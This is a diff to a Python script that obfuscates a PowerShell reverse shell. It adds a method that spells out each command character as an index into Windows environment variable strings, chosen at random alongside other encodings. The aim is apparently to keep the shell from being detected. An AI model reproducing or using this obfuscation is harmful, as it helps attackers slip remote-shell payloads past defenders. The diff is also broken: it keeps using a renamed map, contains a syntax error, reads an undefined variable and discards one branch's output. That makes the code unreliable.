@@ -92,7 +92,7 @@ env = [
 	"windir"
 ]
 
-envMap = {}
+environment_variable_character_map = {}
 
 for c in string.printable:
     envMap[c] = {}
@@ -104,28 +104,24 @@ for c in string.printable:
                 if c == t:
                     envMap[c][v].append(i)
                     
-def env_hide(object):
+def environment_variables_2_string(object):
     if isinstance(match, str):
         command = match
     else:
         command = match.group(0)[1:-1]
 	    
     hidden_strings = []
-    for c in command:
-        if c in envMap and envMap[c]:
-            pVars = list(envMap[c].keys())
-            cVar = random.choice(pVars)
-            pIndex = envMap[c][cVar]
-            cIndex = random.choice(pIndex)
-            hidden_strings.append(f"$env:{cVar}[{cIndex}]")
+    for character in command:
+        if character in environment_variable_character_map and environment_variable_character_map[character]:
+            possible_variables = list(environment_variable_character_map[character].keys())
+            chosen_variable = random.choice(possible_variables)
+            possible_index = envMap[character]chosen_variable]
+            chosen_index = random.choice(possible_index)
+            hidden_strings.append(f"$env:{chosen_variable}[{chosen_index}]")
         else:
-            rand = random.randint(1, 3)
-            if rand == 1:
-                hidden_strings.append(part_to_char(c))
-            elif rand == 2:
-                hidden_strings.append(part_math(c))
-            else:
-                hidden_strings.append(rand_part_index(c))
+            random.choice([list_2_character_2_string,
+                           character_2_string,
+                           random_string_2_string])(character)
     return "+".join(hidden_strings)
 
 # REPLACE EACH MATCH WITH RANDOM METHOD
@@ -133,7 +129,8 @@ for match in range(int(reverse_shell.count("/")/2)):
     reverse_shell = re.sub(pattern,
                            lambda m: random.choice([list_2_character_2_string,
                                                     character_2_string,
-                                                    random_string_2_string])(m),
+                                                    random_string_2_string,
+						    environment_variables_2_string])(m),
                            reverse_shell,
                            count=1)
 
